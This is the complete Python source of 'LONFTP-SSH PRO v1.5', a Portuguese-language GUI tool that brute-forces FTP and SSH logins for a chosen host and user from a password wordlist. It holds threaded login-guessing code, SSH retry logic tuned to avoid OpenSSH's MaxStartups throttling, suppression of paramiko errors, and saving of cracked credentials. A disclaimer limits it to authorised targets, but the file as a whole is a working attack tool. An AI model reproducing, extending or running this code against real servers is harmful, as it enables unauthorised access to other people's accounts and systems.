#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  LONFTP-SSH PRO v1.5  —  Brute Force GUI (FTP / SSH)
  Versão leve: máximo 5 threads (PC fraco)
  Uso exclusivo em alvos previamente autorizados.

  [v1.5] Silencia ruído do paramiko (banner), retry automático
         em falhas transientes, SSH limitado a 3 threads e
         pré-checagem do banner SSH antes do ataque.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import socket
import threading
import queue as fila_mod
import time
import logging
from datetime import datetime
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox

try:
    import paramiko
    PARAMIKO_OK = True
    # [v1.5] mata o spam de traceback interno do paramiko
    #        ("Error reading SSH protocol banner" no console)
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)

    _excepthook_original = threading.excepthook

    def _silenciar_ruido_paramiko(args):
        """Deixa passar qualquer erro real, mas engole SSHException de banner
        lançada dentro da thread de transporte do paramiko."""
        try:
            if (getattr(args, "exc_type", None) is paramiko.SSHException
                    and "banner" in str(getattr(args, "exc_value", "")).lower()):
                return
        except Exception:
            pass
        _excepthook_original(args)

    threading.excepthook = _silenciar_ruido_paramiko
except ImportError:
    paramiko = None
    PARAMIKO_OK = False

# ── paleta visual "hacker" ──
BG       = "#050505"
BG2      = "#0b0f0b"
VERDE    = "#00ff41"
VERDE2   = "#39ff14"
AMARELO  = "#ffd700"
VERMELHO = "#ff3333"
CINZA    = "#7a7a7a"
FONTE    = "Consolas"

MAX_THREADS = 5          # ← limite global para PC fraco
MAX_THREADS_SSH = 3      # [v1.5] abaixo do MaxStartups do OpenSSH


class LonFTPSSH:
    def __init__(self, root):
        self.root = root
        self.rodando = False
        self.stop_event = threading.Event()
        self.achou = threading.Event()
        self.senha_achada = None
        self._ok_logado = False
        self._aviso_mostrado = False
        self.workers = []
        self.fila_senhas = fila_mod.Queue()
        self.fila_resultados = fila_mod.Queue()
        self.contador = {"testados": 0, "total": 0, "achados": 0}
        self.arquivo_saida = ""
        self.achadas = []

        import platform

        root.title("Brute Force FTP/SSH")
        root.configure(bg=BG)
        root.geometry("1000x840")
        root.resizable(True, True)

        # Maximizar conforme o sistema operacional
        if platform.system() == "Windows":
            root.state("zoomed")          # Windows
        else:
            try:
                root.attributes("-zoomed", True)  # Linux (Kali, Ubuntu, etc.)
            except:
                # Fallback caso o window manager não suporte -zoomed
                root.attributes("-fullscreen", True)

        root.protocol("WM_DELETE_WINDOW", self._sair)

        self._variaveis()
        self._interface()
        self.root.after(80, self._processar_resultados)

    def _variaveis(self):
        self.var_host    = tk.StringVar()
        self.var_user    = tk.StringVar()
        self.var_porta   = tk.StringVar(value="21")
        self.var_arquivo = tk.StringVar()
        self.var_proto   = tk.StringVar(value="FTP")
        self.var_threads = tk.StringVar(value="5")
        self.var_timeout = tk.StringVar(value="8")
        self.alvo = ("", 21, "")
        self.timeout = 8.0

    # ───────────────────────── interface ─────────────────────────
    def _interface(self):
        topo = tk.Frame(self.root, bg=BG)
        topo.pack(fill=tk.X, padx=10, pady=(10, 0))
        tk.Label(topo, text="╔══════════════════════════════════════════════════╗\n"
                            "║  LONFTP-SSH PRO v1.5 | FTP/SSH BRUTE FORCE       ║\n"
                            "╚══════════════════════════════════════════════════╝",
                 bg=BG, fg=VERDE, font=(FONTE, 11, "bold"),
                 justify=tk.CENTER).pack()

        quadro = tk.LabelFrame(self.root, text="  ALVO  ", bg=BG, fg=VERDE,
                               font=(FONTE, 10, "bold"), bd=1, relief=tk.GROOVE)
        quadro.pack(fill=tk.X, padx=10, pady=8)
        self._campo(quadro, "Host/IP:", self.var_host, 0, 0)
        self._campo(quadro, "Usuário:", self.var_user, 0, 2)
        self._campo(quadro, "Porta:", self.var_porta, 0, 4, largura=7)

        tk.Label(quadro, text="Wordlist:", bg=BG, fg=VERDE,
                 font=(FONTE, 10)).grid(row=1, column=0, sticky="e", padx=5, pady=5)
        tk.Entry(quadro, textvariable=self.var_arquivo, width=44, bg=BG2, fg=VERDE,
                 insertbackground=VERDE, font=(FONTE, 10),
                 relief=tk.FLAT).grid(row=1, column=1, columnspan=3, pady=5, sticky="we")
        tk.Button(quadro, text="ABRIR", command=self._abrir_wordlist, bg=BG2,
                  fg=VERDE2, activebackground=VERDE, activeforeground=BG,
                  font=(FONTE, 9, "bold"), relief=tk.FLAT,
                  cursor="hand2").grid(row=1, column=4, padx=5)

        quadro2 = tk.LabelFrame(self.root, text="  CONFIG  ", bg=BG, fg=VERDE,
                                font=(FONTE, 10, "bold"), bd=1, relief=tk.GROOVE)
        quadro2.pack(fill=tk.X, padx=10, pady=8)

        self.radio_ftp = tk.Radiobutton(quadro2, text="FTP", variable=self.var_proto,
                                        value="FTP", command=self._trocar_protocolo,
                                        bg=BG, fg=VERDE, selectcolor=BG,
                                        activebackground=BG, activeforeground=VERDE2,
                                        font=(FONTE, 11, "bold"))
        self.radio_ftp.grid(row=0, column=0, padx=10, pady=8)
        self.radio_ssh = tk.Radiobutton(quadro2, text="SSH", variable=self.var_proto,
                                        value="SSH", command=self._trocar_protocolo,
                                        bg=BG, fg=VERDE, selectcolor=BG,
                                        activebackground=BG, activeforeground=VERDE2,
                                        font=(FONTE, 11, "bold"))
        self.radio_ssh.grid(row=0, column=1, padx=10)

        tk.Label(quadro2, text="Threads:", bg=BG, fg=VERDE,
                 font=(FONTE, 10)).grid(row=0, column=2, padx=(30, 5))
        tk.Spinbox(quadro2, from_=1, to=MAX_THREADS,
                   textvariable=self.var_threads, width=6,
                   bg=BG2, fg=VERDE, insertbackground=VERDE, buttonbackground=BG2,
                   font=(FONTE, 10), relief=tk.FLAT).grid(row=0, column=3)

        tk.Label(quadro2, text="Timeout(s):", bg=BG, fg=VERDE,
                 font=(FONTE, 10)).grid(row=0, column=4, padx=(30, 5))
        tk.Spinbox(quadro2, from_=1, to=60, textvariable=self.var_timeout, width=6,
                   bg=BG2, fg=VERDE, insertbackground=VERDE, buttonbackground=BG2,
                   font=(FONTE, 10), relief=tk.FLAT).grid(row=0, column=5)

        botoes = tk.Frame(self.root, bg=BG)
        botoes.pack(fill=tk.X, padx=10)
        self.btn_iniciar = tk.Button(botoes, text="▶ INICIAR ATAQUE",
                                     command=self._iniciar, bg=VERDE, fg=BG,
                                     activebackground=VERDE2, activeforeground=BG,
                                     font=(FONTE, 11, "bold"), relief=tk.FLAT,
                                     cursor="hand2", padx=18)
        self.btn_iniciar.pack(side=tk.LEFT, padx=(0, 8), pady=6)
        self.btn_parar = tk.Button(botoes, text="■ PARAR", command=self._parar,
                                   bg=VERMELHO, fg=BG,
                                   activebackground="#ff6666", activeforeground=BG,
                                   font=(FONTE, 11, "bold"), relief=tk.FLAT,
                                   cursor="hand2", padx=18, state=tk.DISABLED)
        self.btn_parar.pack(side=tk.LEFT, padx=8)
        self.btn_salvar = tk.Button(botoes, text="💾 SALVAR RESULTADOS",
                                    command=self._salvar_manual, bg=AMARELO, fg=BG,
                                    activebackground=VERDE2, activeforeground=BG,
                                    font=(FONTE, 10, "bold"), relief=tk.FLAT,
                                    cursor="hand2", padx=12, state=tk.DISABLED)
        self.btn_salvar.pack(side=tk.LEFT, padx=8)
        tk.Button(botoes, text="LIMPAR LOG", command=self._limpar_log, bg=BG2,
                  fg=VERDE, activebackground=VERDE, activeforeground=BG,
                  font=(FONTE, 10, "bold"), relief=tk.FLAT,
                  cursor="hand2").pack(side=tk.RIGHT)

        estilo = ttk.Style()
        estilo.theme_use("clam")
        estilo.configure("Lon.Horizontal.TProgressbar", background=VERDE,
                         troughcolor=BG2, bordercolor=BG, lightcolor=VERDE,
                         darkcolor=VERDE2)
        self.barra = ttk.Progressbar(self.root, style="Lon.Horizontal.TProgressbar",
                                     maximum=100)
        self.barra.pack(fill=tk.X, padx=10, pady=(0, 6))

        self.txt_log = scrolledtext.ScrolledText(self.root, bg=BG, fg=VERDE,
                                                 insertbackground=VERDE,
                                                 font=(FONTE, 10), relief=tk.FLAT,
                                                 wrap=tk.WORD, height=18)
        self.txt_log.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 6))
        self.txt_log.tag_configure("info", foreground=VERDE)
        self.txt_log.tag_configure("ok", foreground=AMARELO,
                                   font=(FONTE, 10, "bold"))
        self.txt_log.tag_configure("erro", foreground=VERMELHO)

        self.lbl_status = tk.Label(self.root, text="PRONTO PARA ATACAR (5 threads)",
                                   anchor="w", bg=BG, fg=CINZA, font=(FONTE, 9))
        self.lbl_status.pack(fill=tk.X, padx=10, pady=(0, 8))

        if not PARAMIKO_OK:
            self.radio_ssh.config(state=tk.DISABLED)
            self._log("[!] Paramiko ausente. SSH desativado. Instale: "
                      "pip install paramiko", "erro")

    def _campo(self, pai, rotulo, var, linha, coluna, largura=32):
        tk.Label(pai, text=rotulo, bg=BG, fg=VERDE,
                 font=(FONTE, 10)).grid(row=linha, column=coluna,
                                        sticky="e", padx=5, pady=5)
        tk.Entry(pai, textvariable=var, width=largura, bg=BG2, fg=VERDE,
                 insertbackground=VERDE, font=(FONTE, 10),
                 relief=tk.FLAT).grid(row=linha, column=coluna + 1, pady=5,
                                      sticky="we")

    def _trocar_protocolo(self):
        self.var_porta.set("21" if self.var_proto.get() == "FTP" else "22")

    def _abrir_wordlist(self):
        caminho = filedialog.askopenfilename(title="Selecionar wordlist de senhas")
        if not caminho:
            return
        self.var_arquivo.set(caminho)
        try:
            with open(caminho, errors="ignore") as f:
                unicas = list(dict.fromkeys(
                    l.strip() for l in f if l.strip()))
            self.contador["total"] = len(unicas)
            self._log(f"[*] Wordlist: {caminho}  —  {len(unicas)} senhas únicas "
                      f"(duplicadas removidas)", "info")
        except OSError:
            self._log("[!] Não foi possível ler a wordlist", "erro")

    def _log(self, msg, tag):
        self.txt_log.insert(tk.END, f"{msg}\n", tag)
        self.txt_log.see(tk.END)
        linhas = int(self.txt_log.index("end-1c").split(".")[0])
        if linhas > 2000:
            self.txt_log.delete("1.0", "300.0")

    # ───────────────────────── ataque ─────────────────────────
    def _iniciar(self):
        if self.rodando:
            return
        host = self.var_host.get().strip()
        user = self.var_user.get().strip()
        caminho = self.var_arquivo.get().strip()
        if not host or not user or not caminho:
            messagebox.showerror("Erro",
                                 "Preencha Host/IP, Usuário e selecione a wordlist.")
            return
        if self.var_proto.get() == "SSH" and not PARAMIKO_OK:
            messagebox.showerror("Erro", "Paramiko não instalado "
                                         "(pip install paramiko).")
            return
        try:
            porta = int(self.var_porta.get())
        except ValueError:
            porta = 21
        try:
            with open(caminho, errors="ignore") as f:
                senhas = list(dict.fromkeys(
                    linha.strip() for linha in f if linha.strip()))
        except OSError:
            messagebox.showerror("Erro", "Wordlist não encontrada.")
            return
        if not senhas:
            messagebox.showerror("Erro", "A wordlist está vazia.")
            return

        self.stop_event.clear()
        self.achou.clear()
        self.senha_achada = None
        self._ok_logado = False
        self._aviso_mostrado = False
        self.fila_senhas = fila_mod.Queue()
        self.fila_resultados = fila_mod.Queue()
        for s in senhas:
            self.fila_senhas.put(s)

        self.contador = {"testados": 0, "total": len(senhas), "achados": 0}
        self.achadas = []
        self.btn_salvar.config(state=tk.DISABLED)
        self.alvo = (host, porta, user)
        self.arquivo_saida = ""
        try:
            self.timeout = float(self.var_timeout.get())
        except ValueError:
            self.timeout = 8.0
        proto = self.var_proto.get()

        # [v1.5] pré-checagem do serviço SSH antes de soltar as threads
        if proto == "SSH":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((host, porta))
                try:
                    ban = s.recv(256).decode("latin-1", errors="ignore").strip()
                except socket.timeout:
                    ban = ""
                finally:
                    s.close()
                if ban:
                    self._log(f"\n[+] Banner SSH: {ban}", "info")
                else:
                    self._log("\n[!] TCP ok, mas banner não veio — servidor lento "
                              "ou descartando conexões (MaxStartups). Retry "
                              "automático ativado\n", "info")
            except OSError as e:
                messagebox.showerror("Erro",
                                     f"Falha ao conectar em {host}:{porta}\n\n{e}")
                return

        self.rodando = True
        self.barra["value"] = 0
        self.btn_iniciar.config(state=tk.DISABLED)
        self.btn_parar.config(state=tk.NORMAL)
        self.lbl_status.config(fg=VERDE2)

        # [v1.5] SSH limitado a 3 threads (evita MaxStartups/quedas de banner)
        try:
            n_threads = max(1, min(MAX_THREADS, int(self.var_threads.get())))
        except ValueError:
            n_threads = MAX_THREADS
        if proto == "SSH" and n_threads > MAX_THREADS_SSH:
            self._log(f"\n[i] SSH: limitando a {MAX_THREADS_SSH} threads — "
                      f"conexões paralelas demais fazem o servidor descartar "
                      f"handshakes (MaxStartups)\n", "info")
            n_threads = MAX_THREADS_SSH

        self._log(f"\n[*] Iniciando brute force {proto} em {host}:{porta} "
                  f"(user: {user}) — {len(senhas)} senhas únicas, "
                  f"{n_threads} threads\n", "info")

        self.workers = []
        for i in range(n_threads):
            t = threading.Thread(target=self._worker, args=(proto,), daemon=True)
            t.start()
            self.workers.append(t)
            time.sleep(0.15)               # [v1.5] escalona conexões simultâneas

    def _worker(self, proto):
        host, porta, user = self.alvo
        while not self.stop_event.is_set() and not self.achou.is_set():
            try:
                senha = self.fila_senhas.get_nowait()
            except fila_mod.Empty:
                return
            if self.achou.is_set():
                self.fila_senhas.task_done()
                return

            acertou = self._testar(proto, host, porta, user, senha)

            if acertou:
                if self.achou.is_set():
                    self.fila_senhas.task_done()
                    return
                self.senha_achada = senha
                self.achou.set()
                self.stop_event.set()
                self.fila_resultados.put(("OK", senha))
                self.fila_senhas.task_done()
                return

            self.fila_senhas.task_done()
            if self.achou.is_set():
                return
            self.fila_resultados.put(("FAIL", senha))

    def _testar(self, proto, host, porta, user, senha):
        timeout = self.timeout
        if proto == "FTP":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((host, porta))
                s.recv(1024)
                s.sendall(f"USER {user}\r\n".encode())
                s.recv(1024)
                s.sendall(f"PASS {senha}\r\n".encode())
                resp = s.recv(1024).decode("latin-1", errors="ignore").strip()
                s.sendall(b"QUIT\r\n")
                s.close()
                return resp.startswith("230")        # 230 = login OK
            except Exception:
                return False
        else:
            # [v1.5] até 2 tentativas: a 1ª pode ser descartada pelo
            #        MaxStartups/lentidão; a 2ª normalmente completa o handshake
            for tentativa in range(2):
                try:
                    cli = paramiko.SSHClient()
                    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    cli.connect(hostname=host, port=porta, username=user,
                                password=senha, timeout=timeout,
                                banner_timeout=timeout, auth_timeout=timeout,
                                allow_agent=False, look_for_keys=False)
                    cli.close()
                    return True
                except paramiko.AuthenticationException:
                    return False
                except paramiko.SSHException as e:
                    # falha transiente de banner → tenta 1x após pausa curta
                    if tentativa == 0 and "banner" in str(e).lower():
                        time.sleep(0.7)
                        continue
                    return False
                except (EOFError, socket.error, OSError):
                    return False
            return False

    def _processar_resultados(self):
        try:
            while True:
                tipo, senha = self.fila_resultados.get_nowait()
                if self.achou.is_set():
                    if tipo == "FAIL":
                        continue
                    if self._ok_logado:
                        continue
                self.contador["testados"] += 1
                if tipo == "OK":
                    self.contador["achados"] += 1
                    self._ok_logado = True
                    self.achadas.append(senha)
                    self.btn_salvar.config(state=tk.NORMAL)
                    self.achou.set()
                    self.senha_achada = senha
                    self._log(f"\n[+] SENHA ENCONTRADA  →  {senha}", "ok")
                else:
                    self._log(f"[-] {senha}", "erro")
        except fila_mod.Empty:
            pass

        total = self.contador["total"]
        testados = self.contador["testados"]
        if total:
            self.barra["value"] = testados * 100.0 / total

        if self.achou.is_set() and self.rodando:
            vivos = sum(1 for t in self.workers if t.is_alive())
            self.lbl_status.config(
                text=f"⛔ SENHA ENCONTRADA — PARANDO... "
                     f"(aguardando {vivos} threads)")

        if self.rodando and self.workers and all(not t.is_alive()
                                                 for t in self.workers):
            self.rodando = False
            self.btn_iniciar.config(state=tk.NORMAL)
            self.btn_parar.config(state=tk.DISABLED)
            self.lbl_status.config(fg=CINZA)
            if self.achou.is_set() and self.senha_achada:
                self._log("\n" + "═" * 56, "ok")
                self._log(f"  ATAQUE ENCERRADO — SENHA ENCONTRADA\n", "ok")
                self._log(f"  HOST   : {self.alvo[0]}", "ok")
                self._log(f"  PORTA  : {self.alvo[1]}", "ok")
                self._log(f"  USUÁRIO: {self.alvo[2]}", "ok")
                self._log(f"  SENHA  : {self.senha_achada}", "ok")
                self._log("═" * 56, "ok")
                if not self._aviso_mostrado:
                    self._aviso_mostrado = True
                    self.root.after(50, lambda: messagebox.showinfo(
                        "SENHA ENCONTRADA",
                        f"Host    : {self.alvo[0]}\n"
                        f"Porta   : {self.alvo[1]}\n"
                        f"Usuário : {self.alvo[2]}\n"
                        f"Senha   : {self.senha_achada}"))
            elif self.stop_event.is_set():
                self._log("[*] Ataque interrompido pelo usuário.", "erro")
            else:
                self._log("\n[*] Ataque concluído. Nenhuma senha encontrada.",
                          "info")
        self.root.after(80, self._processar_resultados)

    # ───────────────────────── salvamento manual ─────────────────────────
    def _salvar_manual(self):
        if not self.achadas:
            messagebox.showinfo("Info", "Nenhuma senha encontrada para salvar.")
            return
        caminho = filedialog.asksaveasfilename(
            title="Salvar resultados",
            defaultextension=".txt",
            initialfile=f"found_{self.alvo[0]}.txt",
            filetypes=[("Arquivo de texto", "*.txt"), ("Todos os arquivos", "*.*")])
        if not caminho:
            return
        try:
            with open(caminho, "w", encoding="utf-8") as f:
                # um bloco formatado por senha encontrada (mesmo estilo do log)
                for senha in self.achadas:
                    f.write("=" * 56 + "\n")
                    f.write("  ATAQUE ENCERRADO - SENHA ENCONTRADA\n\n")
                    f.write(f"  HOST   : {self.alvo[0]}\n")
                    f.write(f"  PORTA  : {self.alvo[1]}\n")
                    f.write(f"  USUARIO: {self.alvo[2]}\n")
                    f.write(f"  SENHA  : {senha}\n")
                    f.write("=" * 56 + "\n")
                    f.write("\n")
            self._log(f"[*] {len(self.achadas)} senhas salvas em: {caminho}",
                      "info")
            messagebox.showinfo("Salvo",
                                f"{len(self.achadas)} senhas salvas em\n\n{caminho}")
        except OSError as e:
            self._log(f"[!] Erro ao salvar: {e}", "erro")
            messagebox.showerror("Erro", f"Não foi possível salvar:\n{e}")

    def _parar(self):
        if self.rodando:
            self.stop_event.set()
            self._log("[!] Parando… aguardando threads terminarem.", "info")

    def _limpar_log(self):
        self.txt_log.delete("1.0", tk.END)

    def _sair(self):
        self.stop_event.set()
        self.root.destroy()


def main():
    root = tk.Tk()
    LonFTPSSH(root)
    root.mainloop()


if __name__ == "__main__":
    main()
